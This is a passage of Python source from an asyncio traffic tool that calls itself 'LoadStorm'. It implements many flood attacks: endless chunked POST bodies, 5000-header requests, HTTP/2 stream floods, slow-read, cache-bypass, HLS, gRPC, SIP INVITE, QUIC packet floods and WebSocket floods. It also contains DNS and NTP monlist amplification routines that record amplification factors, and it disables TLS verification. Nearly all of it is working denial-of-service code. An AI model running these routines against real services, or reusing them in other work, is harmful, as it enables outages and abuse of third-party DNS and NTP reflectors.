            headers['If-Modified-Since'] = 'Thu, 01 Jan 1970 00:00:00 GMT'

            connect_start = time.time()
            timeout = aiohttp.ClientTimeout(total=self.cfg['timeout'])
            async with session.get(target_url, headers=headers, ssl=False,
                                   allow_redirects=self.cfg['follow'],
                                   timeout=timeout) as resp:
                connect_ms = (time.time() - connect_start) * 1000
                result['connect_time_ms'] = connect_ms
                data = await resp.read()
                elapsed = (time.time() - connect_start) * 1000
                result['status'] = resp.status
                result['time'] = elapsed
                result['size'] = len(data)
                result['bytes_recv'] = len(data)
                result['bytes_sent'] = len(target_url) + sum(len(f"{k}: {v}") for k, v in headers.items())
                result['headers'] = dict(resp.headers)
                result['ttfb_ms'] = connect_ms * 0.3
                result['network_overhead_est'] = connect_ms * 0.3
        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
        except aiohttp.ClientError:
            result['error'] = 'conn'
            result['error_type'] = 'connection'
        except Exception:
            result['error'] = 'unknown'
            result['error_type'] = 'unknown'
        return result

    async def _fire_endless_data(self, uid: int, url: str):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))
        try:
            parsed = urlparse(url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            ssl_ctx = None
            if parsed.scheme == 'https':
                import ssl
                ssl_ctx = ssl.create_default_context()
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE

            connect_start = time.time()
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ssl_ctx),
                timeout=self.cfg['timeout']
            )
            connect_ms = (time.time() - connect_start) * 1000
            result['connect_time_ms'] = connect_ms

            headers_str = (
                f"POST {parsed.path or '/'} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"X-Correlation-ID: {result.get('correlation_id') or '-'}\r\n"
                f"Content-Type: application/octet-stream\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Connection: close\r\n\r\n"
            )
            writer.write(headers_str.encode())
            await writer.drain()
            sent_bytes = len(headers_str)
            chunk_count = 0

            while not self._stop.is_set():
                chunk = os.urandom(1024)
                writer.write(f"{len(chunk):x}\r\n".encode())
                writer.write(chunk)
                writer.write(b"\r\n")
                await writer.drain()
                sent_bytes += len(chunk) + len(f"{len(chunk):x}\r\n") + 2
                chunk_count += 1
                if chunk_count % 50 == 0:
                    await asyncio.sleep(0.01)
                try:
                    peek = await asyncio.wait_for(reader.read(1), timeout=0.5)
                    if not peek:
                        break
                except asyncio.TimeoutError:
                    pass
                except Exception:
                    break

            elapsed = (time.time() - connect_start) * 1000
            try:
                data = await asyncio.wait_for(reader.read(8192), timeout=2)
                result['size'] = len(data)
                result['bytes_recv'] = len(data)
                if data:
                    status_line = data.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                    if ' ' in status_line:
                        parts = status_line.split(' ')
                        if len(parts) >= 2:
                            result['status'] = int(parts[1])
            except Exception:
                pass

            result['time'] = elapsed
            result['bytes_sent'] = sent_bytes
            result['network_overhead_est'] = connect_ms * 0.3
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
        except Exception:
            result['error'] = 'conn'
            result['error_type'] = 'connection'
        return result

    async def _fire_header_flood(self, uid: int, url: str):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))
        try:
            parsed = urlparse(url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            ssl_ctx = None
            if parsed.scheme == 'https':
                import ssl
                ssl_ctx = ssl.create_default_context()
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE

            connect_start = time.time()
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ssl_ctx),
                timeout=self.cfg['timeout']
            )
            connect_ms = (time.time() - connect_start) * 1000
            result['connect_time_ms'] = connect_ms

            path = parsed.path or '/'
            flood_count = self.cfg.get('header_flood_count', 5000)
            lines = [f"GET {path} HTTP/1.1\r\n", f"Host: {host}\r\n",
                     f"X-Correlation-ID: {result.get('correlation_id') or '-'}\r\n"]
            for i in range(flood_count):
                lines.append(f"X-Flood-{i:05d}: {_rand_str(64)}\r\n")
            lines.append("\r\n")
            headers_bytes = ''.join(lines).encode()

            writer.write(headers_bytes)
            await writer.drain()
            sent_bytes = len(headers_bytes)

            elapsed = (time.time() - connect_start) * 1000
            try:
                data = await asyncio.wait_for(reader.read(8192), timeout=self.cfg['timeout'])
                result['size'] = len(data)
                result['bytes_recv'] = len(data)
                if data:
                    status_line = data.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                    if ' ' in status_line:
                        parts = status_line.split(' ')
                        if len(parts) >= 2:
                            result['status'] = int(parts[1])
            except Exception:
                pass

            result['time'] = elapsed
            result['bytes_sent'] = sent_bytes
            result['network_overhead_est'] = connect_ms * 0.3
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
        except Exception:
            result['error'] = 'conn'
            result['error_type'] = 'connection'
        return result

    async def _fire_h2_flood(self, session: aiohttp.ClientSession, uid: int, url: str):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))
        try:
            target_url = url
            if self.cfg.get('random_path'):
                base = target_url.rstrip('/')
                target_url = base + _get_random_path()

            sep = '&' if '?' in target_url else '?'
            target_url = f"{target_url}{sep}{_build_qs()}&_={int(time.time()*1000)}"

            headers = self._build_headers(correlation_id=result.get('correlation_id'))
            headers['Connection'] = 'keep-alive'

            h2_tasks = []
            stream_count = self.cfg.get('h2_streams', 100)
            connect_start = time.time()
            total_bytes = 0
            statuses = []
            for _ in range(stream_count):
                unique_url = f"{target_url}&_s={_rand_str(8)}"
                h2_tasks.append(self._h2_single_stream(session, unique_url, dict(headers)))
            results = await asyncio.gather(*h2_tasks, return_exceptions=True)
            for r in results:
                if isinstance(r, dict):
                    total_bytes += r.get('size', 0)
                    if r.get('status'):
                        statuses.append(r['status'])
            elapsed = (time.time() - connect_start) * 1000
            result['time'] = elapsed
            result['size'] = total_bytes
            result['bytes_recv'] = total_bytes
            result['bytes_sent'] = sum(len(t) for t in h2_tasks)
            if statuses:
                result['status'] = max(set(statuses), key=statuses.count)
            else:
                result['status'] = 200
            result['network_overhead_est'] = elapsed * 0.1
        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
        except aiohttp.ClientError:
            result['error'] = 'conn'
            result['error_type'] = 'connection'
        except Exception:
            result['error'] = 'unknown'
            result['error_type'] = 'unknown'
        return result

    async def _h2_single_stream(self, session: aiohttp.ClientSession, url: str, headers: dict) -> dict:
        res = {'status': 0, 'size': 0}
        try:
            timeout = aiohttp.ClientTimeout(total=self.cfg['timeout'])
            async with session.get(url, headers=headers, ssl=False,
                                   allow_redirects=self.cfg['follow'],
                                   timeout=timeout) as resp:
                data = await resp.read()
                res['status'] = resp.status
                res['size'] = len(data)
        except Exception:
            pass
        return res

    async def _fire_websocket_flood(self, uid: int, url: str):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))
        msg_count = self.cfg.get('ws_flood_count', 1000)
        msg_size = self.cfg.get('ws_msg_size', 64)
        msg_type = self.cfg.get('ws_msg_type', 'text')
        try:
            connect_start = time.time()
            async with websockets.connect(url, open_timeout=self.cfg['timeout']) as ws:
                connect_ms = (time.time() - connect_start) * 1000
                result['connect_time_ms'] = connect_ms
                sent = 0
                recv = 0
                msgs_sent = 0
                for i in range(msg_count):
                    if self._stop.is_set():
                        break
                    if msg_type == 'binary':
                        payload = os.urandom(msg_size)
                    else:
                        payload = _rand_str(msg_size)
                    await ws.send(payload)
                    sent += len(payload) if isinstance(payload, (bytes, str)) else 0
                    msgs_sent += 1
                    try:
                        resp = await asyncio.wait_for(ws.recv(), timeout=2)
                        recv += len(resp)
                    except asyncio.TimeoutError:
                        pass
                elapsed = (time.time() - connect_start) * 1000
                result['time'] = elapsed
                result['status'] = 101
                result['bytes_sent'] = sent
                result['bytes_recv'] = recv
                result['size'] = recv
                result['ws_msgs'] = msgs_sent
                result['network_overhead_est'] = connect_ms * 0.3
        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
        except Exception:
            result['error'] = 'ws_error'
            result['error_type'] = 'connection'
        return result

    async def _fire_slow_read(self, session: aiohttp.ClientSession, uid: int, url: str):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))
        try:
            target_url = url
            if self.cfg.get('random_path'):
                base = target_url.rstrip('/')
                target_url = base + _get_random_path()
            sep = '&' if '?' in target_url else '?'
            target_url = f"{target_url}{sep}{_build_qs()}&_={int(time.time()*1000)}"
            headers = self._build_headers(correlation_id=result.get('correlation_id'))
            headers['Connection'] = 'keep-alive'
            connect_start = time.time()
            timeout = aiohttp.ClientTimeout(total=self.cfg['timeout'])
            async with session.get(target_url, headers=headers, ssl=False,
                                   allow_redirects=self.cfg['follow'],
                                   timeout=timeout) as resp:
                connect_ms = (time.time() - connect_start) * 1000
                result['connect_time_ms'] = connect_ms
                result['status'] = resp.status
                total_data = b''
                chunk_size = self.cfg.get('slow_read_chunk', 1)
                read_delay = self.cfg.get('slow_read_delay', 0.1)
                while not self._stop.is_set():
                    try:
                        chunk = await asyncio.wait_for(resp.content.read(chunk_size), timeout=2)
                        if not chunk:
                            break
                        total_data += chunk
                        await asyncio.sleep(read_delay)
                    except asyncio.TimeoutError:
                        break
                elapsed = (time.time() - connect_start) * 1000
                result['time'] = elapsed
                result['size'] = len(total_data)
                result['bytes_recv'] = len(total_data)
                result['headers'] = dict(resp.headers)
                result['ttfb_ms'] = connect_ms * 0.3
                result['network_overhead_est'] = connect_ms * 0.3
        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
        except aiohttp.ClientError:
            result['error'] = 'conn'
            result['error_type'] = 'connection'
        except Exception:
            result['error'] = 'unknown'
            result['error_type'] = 'unknown'
        return result

    async def _fire_cache_bypass(self, session: aiohttp.ClientSession, uid: int, url: str):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))
        try:
            target_url = url.rstrip('/')
            sep = '&' if '?' in target_url else '?'
            unique_id = _rand_str(32)
            timestamp = int(time.time() * 1000)
            target_url = f"{target_url}{sep}nocache={unique_id}&_t={timestamp}&_r={random.randint(1, 999999)}&_cb={hashlib.md5(unique_id.encode()).hexdigest()[:16]}"
            headers = self._build_headers(correlation_id=result.get('correlation_id'))
            headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
            headers['Pragma'] = 'no-cache'
            headers['Expires'] = '0'
            headers['If-None-Match'] = f'"{_rand_str(32)}"'
            headers['If-Modified-Since'] = 'Thu, 01 Jan 1970 00:00:00 GMT'
            connect_start = time.time()
            timeout = aiohttp.ClientTimeout(total=self.cfg['timeout'])
            async with session.get(target_url, headers=headers, ssl=False,
                                   allow_redirects=self.cfg['follow'],
                                   timeout=timeout) as resp:
                connect_ms = (time.time() - connect_start) * 1000
                data = await resp.read()
                elapsed = (time.time() - connect_start) * 1000
                result['status'] = resp.status
                result['time'] = elapsed
                result['size'] = len(data)
                result['bytes_recv'] = len(data)
                result['connect_time_ms'] = connect_ms
                result['headers'] = dict(resp.headers)
                result['ttfb_ms'] = connect_ms * 0.3
                result['network_overhead_est'] = connect_ms * 0.3
                result['bytes_sent'] = len(target_url) + sum(len(f"{k}: {v}") for k, v in headers.items())
        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
        except aiohttp.ClientError:
            result['error'] = 'conn'
            result['error_type'] = 'connection'
        except Exception:
            result['error'] = 'unknown'
            result['error_type'] = 'unknown'
        return result

    async def _hls_fetch(self, session: aiohttp.ClientSession, url: str, headers: dict) -> Tuple[int, int, bytes, dict]:
        timeout = aiohttp.ClientTimeout(total=self.cfg['timeout'])
        async with session.get(url, headers=headers, ssl=False,
                               allow_redirects=True, timeout=timeout) as resp:
            data = await resp.read()
            return resp.status, len(data), data, dict(resp.headers)

    async def _fire_hls_flood(self, session: aiohttp.ClientSession, uid: int, url: str):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))
        try:
            manifest_url = url
            path_lower = urlparse(url).path.lower()
            if not path_lower.endswith(('.m3u8', '.mpd')):
                manifest_url = url.rstrip('/') + random.choice(
                    ['/master.m3u8', '/index.m3u8', '/manifest.mpd', '/stream.m3u8', '/playlist.m3u8'])
            sep = '&' if '?' in manifest_url else '?'
            manifest_url = f"{manifest_url}{sep}v={_rand_str(8)}&_={int(time.time() * 1000)}"
            headers = self._build_headers(correlation_id=result.get('correlation_id'))
            headers['Accept'] = 'application/vnd.apple.mpegurl, application/dash+xml, application/xml, */*'
            connect_start = time.time()
            statuses = []
            total_bytes = 0
            total_sent = len(manifest_url) + sum(len(f"{k}: {v}") for k, v in headers.items())

            m_status, m_len, m_body, m_headers = await self._hls_fetch(session, manifest_url, headers)
            statuses.append(m_status)
            total_bytes += m_len
            result['headers'] = m_headers
            result['connect_time_ms'] = (time.time() - connect_start) * 1000
            manifest_text = m_body.decode('utf-8', errors='replace')

            base_dir = manifest_url.rsplit('/', 1)[0] + '/'
            refs = []
            for line in manifest_text.splitlines():
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                refs.append(urljoin(base_dir, line))
                if len(refs) >= 40:
                    break

            fetch_targets = []
            variant_urls = [r for r in refs if '.m3u8' in r or '.mpd' in r]
            segment_urls = [r for r in refs if r not in variant_urls]
            fetch_targets.extend(variant_urls[:3])
            seg_budget = max(1, self.cfg.get('hls_segments', 8))
            fetch_targets.extend(segment_urls[:seg_budget])
            if not fetch_targets:
                for i in range(seg_budget):
                    fetch_targets.append(
                        urljoin(base_dir, f"seg_{i:04d}_{_rand_str(6)}.ts?_={_rand_str(8)}"))

            results = await asyncio.gather(
                *[self._hls_fetch(session, u, headers) for u in fetch_targets],
                return_exceptions=True)
            for r in results:
                if isinstance(r, tuple) and len(r) == 4:
                    st, ln, _body, _hdrs = r
                    statuses.append(st)
                    total_bytes += ln

            elapsed = (time.time() - connect_start) * 1000
            result['time'] = elapsed
            result['size'] = total_bytes
            result['bytes_recv'] = total_bytes
            result['bytes_sent'] = total_sent + sum(len(u) for u in fetch_targets)
            result['status'] = max(set(statuses), key=statuses.count) if statuses else 0
            result['body_snippet'] = manifest_text[:512]
            result['ttfb_ms'] = result['connect_time_ms'] * 0.3
            result['network_overhead_est'] = elapsed * 0.1
        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
        except aiohttp.ClientError:
            result['error'] = 'conn'
            result['error_type'] = 'connection'
        except Exception:
            result['error'] = 'unknown'
            result['error_type'] = 'unknown'
        return result

    async def _grpc_single_call(self, session: aiohttp.ClientSession, url: str,
                                headers: dict, body: bytes) -> dict:
        res = {'status': 0, 'size': 0, 'grpc_status': None, 'headers': {}}
        try:
            timeout = aiohttp.ClientTimeout(total=self.cfg['timeout'])
            async with session.post(url, headers=headers, data=body, ssl=False,
                                    allow_redirects=False, timeout=timeout) as resp:
                data = await resp.read()
                res['status'] = resp.status
                res['size'] = len(data)
                res['headers'] = dict(resp.headers)
                grpc_status = resp.headers.get('grpc-status')
                if grpc_status is None:
                    for line in data.split(b'\r\n')[:8]:
                        if line.lower().startswith(b'grpc-status:'):
                            grpc_status = line.split(b':', 1)[1].strip().decode('utf-8', 'ignore')
                            break
                res['grpc_status'] = grpc_status
                if grpc_status is not None and resp.status == 200:
                    try:
                        res['status'] = 200 if int(grpc_status) == 0 else 500 + int(grpc_status)
                    except ValueError:
                        res['status'] = resp.status
        except Exception:
            pass
        return res

    async def _fire_grpc_flood(self, session: aiohttp.ClientSession, uid: int, url: str):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))
        try:
            parsed = urlparse(url)
            target = url
            if not parsed.path or parsed.path in ('/', ''):
                service = self.cfg.get('grpc_method') or \
                    f"{random.choice(['pkg', 'api', 'grpc.health'])}." \
                    f"{random.choice(['Service', 'Health', 'Greeter'])}/" \
                    f"{random.choice(['Stream', 'Check', 'SayHello', 'Watch'])}"
                target = url.rstrip('/') + '/' + service.lstrip('/')

            msg_count = max(1, self.cfg.get('grpc_messages', 10))
            msg_size = max(1, self.cfg.get('ws_msg_size', 64))
            frames = []
            for _ in range(msg_count):
                payload = os.urandom(msg_size)
                frames.append(b'\x00' + struct.pack('>I', len(payload)) + payload)
            body = b''.join(frames)

            headers = self._build_headers(correlation_id=result.get('correlation_id'))
            headers['Content-Type'] = 'application/grpc'
            headers['TE'] = 'trailers'
            headers['grpc-timeout'] = f"{max(1, self.cfg['timeout'])}S"
            headers['grpc-accept-encoding'] = 'gzip, deflate'
            headers['grpc-encoding'] = 'identity'
            headers.pop('Accept-Encoding', None)

            stream_count = max(1, self.cfg.get('grpc_streams', 20))
            connect_start = time.time()
            calls = [
                self._grpc_single_call(session, f"{target}?_={_rand_str(8)}", dict(headers), body)
                for _ in range(stream_count)
            ]
            results = await asyncio.gather(*calls, return_exceptions=True)
            statuses = []
            total_bytes = 0
            for r in results:
                if isinstance(r, dict):
                    if r.get('status'):
                        statuses.append(r['status'])
                    total_bytes += r.get('size', 0)
                    if r.get('headers') and not result.get('headers'):
                        result['headers'] = r['headers']
            elapsed = (time.time() - connect_start) * 1000
            result['time'] = elapsed
            result['size'] = total_bytes
            result['bytes_recv'] = total_bytes
            result['bytes_sent'] = (len(body) + sum(len(f"{k}: {v}") for k, v in headers.items()) + len(target)) * stream_count
            result['status'] = max(set(statuses), key=statuses.count) if statuses else 200
            result['connect_time_ms'] = elapsed * 0.2
            result['ttfb_ms'] = elapsed * 0.3
            result['network_overhead_est'] = elapsed * 0.1
        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
        except aiohttp.ClientError:
            result['error'] = 'conn'
            result['error_type'] = 'connection'
        except Exception:
            result['error'] = 'unknown'
            result['error_type'] = 'unknown'
        return result

    async def _fire_sip_flood(self, uid: int, url: str):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))
        try:
            parsed = urlparse(url)
            host = parsed.hostname
            scheme = (parsed.scheme or '').lower()
            port = parsed.port
            if not host:
                authority = url.split('://', 1)[-1] if '://' in url else url.split(':', 1)[-1]
                authority = authority.split('/', 1)[0]
                if '@' in authority:
                    authority = authority.rsplit('@', 1)[1]
                if ':' in authority:
                    host_part, port_part = authority.rsplit(':', 1)
                    if port_part.isdigit():
                        port = int(port_part)
                    host = host_part
                else:
                    host = authority
            host = host or '127.0.0.1'
            if port is None:
                cfg_port = self.cfg.get('sip_port')
                if cfg_port:
                    port = int(cfg_port)
                elif scheme == 'sips':
                    port = 5061
                elif scheme in ('http', 'https'):
                    port = 5060
                else:
                    port = 5060

            ssl_ctx = None
            if scheme == 'sips':
                import ssl
                ssl_ctx = ssl.create_default_context()
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE

            sip_method = (self.cfg.get('sip_method') or 'INVITE').upper()
            call_id = f"{_rand_str(16)}@{host}"
            tag = _rand_str(12)
            branch = f"z9hG4bK{_rand_str(16)}"
            from_user = random.choice(['alice', 'bob', 'carol', 'loadstorm', _rand_str(6)])
            to_user = random.choice(['service', 'operator', 'support', _rand_str(6)])
            user_addr = f"{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            sdp_body = (
                "v=0\r\n"
                f"o={from_user} {random.randint(1000, 999999)} IN IP4 {user_addr}\r\n"
                f"s=LoadStorm-{_rand_str(6)}\r\n"
                f"c=IN IP4 {user_addr}\r\n"
                f"t=0 0\r\n"
                f"m=audio {random.randint(20000, 65000)} RTP/AVP 0 8\r\n"
                f"a=rtpmap:0 PCMU/8000\r\n"
            )
            request_uri = parsed.path.lstrip('/') if parsed.path and parsed.path != '/' else \
                f"sip:{to_user}@{host}"
            if not request_uri.startswith('sip'):
                request_uri = f"sip:{request_uri}"

            lines = [
                f"{sip_method} {request_uri} SIP/2.0",
                f"Via: SIP/2.0/TCP {host};branch={branch};rport",
                "Max-Forwards: 70",
                f"From: <sip:{from_user}@{host}>;tag={tag}",
                f"To: <sip:{to_user}@{host}>",
                f"Call-ID: {call_id}",
                f"CSeq: 1 {sip_method}",
                f"Contact: <sip:{from_user}@{user_addr}:5060;transport=tcp>",
                "Content-Type: application/sdp" if sip_method == 'INVITE' else "Content-Length: 0",
                "User-Agent: LoadStorm-SIP/8.0",
                f"X-Correlation-ID: {result.get('correlation_id') or '-'}",
                f"Allow: INVITE, ACK, CANCEL, BYE, REGISTER, OPTIONS",
            ]
            if sip_method == 'INVITE':
                lines.append(f"Content-Length: {len(sdp_body)}")
                raw = ("\r\n".join(lines) + "\r\n\r\n" + sdp_body).encode()
            else:
                lines.append("Content-Length: 0")
                raw = ("\r\n".join(lines) + "\r\n\r\n").encode()

            connect_start = time.time()
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ssl_ctx),
                timeout=self.cfg['timeout'],
            )
            connect_ms = (time.time() - connect_start) * 1000
            result['connect_time_ms'] = connect_ms
            writer.write(raw)
            await writer.drain()

            resp_data = b''
            try:
                resp_data = await asyncio.wait_for(reader.read(8192), timeout=min(5, self.cfg['timeout']))
            except asyncio.TimeoutError:
                pass

            elapsed = (time.time() - connect_start) * 1000
            result['time'] = elapsed
            result['bytes_sent'] = len(raw)
            result['bytes_recv'] = len(resp_data)
            result['size'] = len(resp_data)
            if resp_data:
                status_line = resp_data.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                match = re.match(r'SIP/2\.0\s+(\d{3})', status_line)
                if match:
                    result['status'] = int(match.group(1))
                result['body_snippet'] = resp_data[:512].decode('utf-8', errors='replace')
            else:
                result['status'] = 0
            result['network_overhead_est'] = connect_ms * 0.3
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
        except Exception:
            result['error'] = 'conn'
            result['error_type'] = 'connection'
        return result

    async def _fire_quic_flood(self, uid: int, url: str):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))
        try:
            parsed = urlparse(url)
            host = parsed.hostname
            if not host:
                host = url.split('://', 1)[-1].split('/', 1)[0].split(':')[0]
            port = parsed.port or self.cfg.get('quic_port') or 443
            packet_count = max(1, self.cfg.get('quic_packets', 32))
            connect_start = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(min(3, self.cfg['timeout']))
            sent = 0
            recv = 0
            responses = 0
            for _ in range(packet_count):
                if self._stop.is_set():
                    break
                pkt = _build_quic_initial_packet()
                try:
                    sock.sendto(pkt, (host, port))
                    sent += len(pkt)
                except OSError:
                    continue
                try:
                    data, _addr = sock.recvfrom(2048)
                    recv += len(data)
                    responses += 1
                except (socket.timeout, OSError):
                    pass
            try:
                sock.close()
            except OSError:
                pass
            elapsed = (time.time() - connect_start) * 1000
            result['time'] = elapsed
            result['status'] = 200 if responses > 0 else 0
            result['bytes_sent'] = sent
            result['bytes_recv'] = recv
            result['size'] = recv
            result['connect_time_ms'] = elapsed * 0.2
            result['network_overhead_est'] = elapsed * 0.1
            result['quic_packets'] = packet_count
            async with self._lock:
                self.metrics.quic_packets_sent += packet_count
                self.metrics.quic_responses += responses
        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
        except Exception:
            result['error'] = 'conn'
            result['error_type'] = 'connection'
        return result

    async def _fire_dns_amplification(self, uid: int, url: str):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))
        try:
            parsed = urlparse(url)
            host = parsed.hostname
            if not host:
                host = url.split('://', 1)[-1].split('/', 1)[0].split(':')[0]
            port = parsed.port or self.cfg.get('dns_port') or 53
            qtypes = self.cfg.get('dns_qtypes') or [255, 257, 43, 48, 252]
            queries = max(1, self.cfg.get('dns_queries', 8))
            connect_start = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(min(3, self.cfg['timeout']))
            sent = 0
            recv = 0
            responses = 0
            for _ in range(queries):
                if self._stop.is_set():
                    break
                qt = random.choice(qtypes)
                qname = None
                if random.random() > 0.5:
                    qname = '.'.join(_rand_str(random.randint(3, 12)) for _ in range(random.randint(2, 5)))
                query = _build_dns_query(qtype=qt, qname=qname)
                try:
                    sock.sendto(query, (host, port))
                    sent += len(query)
                    self.metrics.dns_queries_sent += 1
                    self.metrics.dns_bytes_sent += len(query)
                except OSError:
                    continue
                try:
                    data, _addr = sock.recvfrom(4096)
                    recv += len(data)
                    responses += 1
                    self.metrics.dns_responses += 1
                    self.metrics.dns_bytes_recv += len(data)
                    if len(query) > 0:
                        self.metrics.amplification_samples.append(len(data) / len(query))
                except (socket.timeout, OSError):
                    pass
            try:
                sock.close()
            except OSError:
                pass
            elapsed = (time.time() - connect_start) * 1000
            amp = (recv / sent) if sent > 0 else 0.0
            result['time'] = elapsed
            result['status'] = 200 if responses > 0 else 0
            result['bytes_sent'] = sent
            result['bytes_recv'] = recv
            result['size'] = recv
            result['connect_time_ms'] = elapsed * 0.2
            result['network_overhead_est'] = elapsed * 0.1
            result['amplification_factor'] = round(amp, 2)
            result['dns_queries'] = queries
        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
        except Exception:
            result['error'] = 'conn'
            result['error_type'] = 'connection'
        return result

    async def _fire_ntp_amplification(self, uid: int, url: str):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))
        try:
            parsed = urlparse(url)
            host = parsed.hostname
            if not host:
                host = url.split('://', 1)[-1].split('/', 1)[0].split(':')[0]
            port = parsed.port or self.cfg.get('ntp_port') or 123
            queries = max(1, self.cfg.get('ntp_queries', 4))
            connect_start = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(min(3, self.cfg['timeout']))
            sent = 0
            recv = 0
            responses = 0
            for _ in range(queries):
                if self._stop.is_set():
                    break
                req = _build_ntp_monlist_request()
                try:
                    sock.sendto(req, (host, port))
                    sent += len(req)
                    self.metrics.ntp_queries_sent += 1
                    self.metrics.ntp_bytes_sent += len(req)
                except OSError:
                    continue
                try:
                    data, _addr = sock.recvfrom(4096)
                    recv += len(data)
                    responses += 1
                    self.metrics.ntp_responses += 1
                    self.metrics.ntp_bytes_recv += len(data)
                    if len(req) > 0:
                        self.metrics.amplification_samples.append(len(data) / len(req))
                except (socket.timeout, OSError):
                    pass
            try:
                sock.close()
            except OSError:
                pass
            elapsed = (time.time() - connect_start) * 1000
            amp = (recv / sent) if sent > 0 else 0.0
            result['time'] = elapsed
            result['status'] = 200 if responses > 0 else 0
            result['bytes_sent'] = sent
            result['bytes_recv'] = recv
            result['size'] = recv
            result['connect_time_ms'] = elapsed * 0.2
            result['network_overhead_est'] = elapsed * 0.1
            result['amplification_factor'] = round(amp, 2)
            result['ntp_queries'] = queries
        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
        except Exception:
            result['error'] = 'conn'
            result['error_type'] = 'connection'
        return result

    async def _fire_websocket_chat(self, uid: int, url: str):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))
        msg_count = max(1, self.cfg.get('ws_chat_count', 200))
        msg_size = max(8, self.cfg.get('ws_msg_size', 64))
        room = self.cfg.get('ws_chat_room') or f"room-{random.randint(1, 50)}"
        try:
            ws_url = self._to_ws_url(url)
            connect_start = time.time()
            async with websockets.connect(ws_url, open_timeout=self.cfg['timeout']) as ws:
                connect_ms = (time.time() - connect_start) * 1000
                result['connect_time_ms'] = connect_ms
                join = json.dumps({
                    'type': 'join', 'room': room, 'user': f"user-{uid}",
                    'correlation_id': result.get('correlation_id') or '',
                })
                await ws.send(join)
                result['bytes_sent'] += len(join)
                sent = len(join)
                recv = 0
                msgs_sent = 1
                templates = [
                    lambda i: json.dumps({'type': 'chat', 'room': room, 'user': f"user-{uid}",
                                          'text': f"msg {i} {_rand_str(msg_size)}"}),
                    lambda i: json.dumps({'type': 'message', 'channel': room,
                                          'body': _rand_str(msg_size), 'n': i}),
                    lambda i: json.dumps({'event': 'typing', 'room': room,
                                          'user': f"user-{uid}", 'seq': i}),
                    lambda i: json.dumps({'type': 'broadcast', 'room': room,
                                          'payload': _rand_str(msg_size)}),
                ]
                for i in range(msg_count):
                    if self._stop.is_set():
                        break
                    payload = random.choice(templates)(i)
                    await ws.send(payload)
                    sent += len(payload)
                    msgs_sent += 1
                    self.metrics.ws_chat_messages_sent += 1
                    if i % 3 == 0:
                        try:
                            resp = await asyncio.wait_for(ws.recv(), timeout=1.0)
                            recv += len(resp) if isinstance(resp, (bytes, str)) else 0
                        except asyncio.TimeoutError:
                            pass
                    try:
                        pong = await ws.ping()
                        await asyncio.wait_for(pong, timeout=2.0)
                    except (asyncio.TimeoutError, Exception):
                        pass
                leave = json.dumps({'type': 'leave', 'room': room, 'user': f"user-{uid}"})
                try:
                    await ws.send(leave)
                    sent += len(leave)
                except Exception:
                    pass
                elapsed = (time.time() - connect_start) * 1000
                result['time'] = elapsed
                result['status'] = 101
                result['bytes_sent'] = sent
                result['bytes_recv'] = recv
                result['size'] = recv
                result['ws_msgs'] = msgs_sent
                result['network_overhead_est'] = connect_ms * 0.3
        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
        except Exception:
            result['error'] = 'ws_error'
            result['error_type'] = 'connection'
        return result

    async def _graphql_single(self, session: aiohttp.ClientSession, url: str,
                              headers: dict, payload: dict) -> dict:
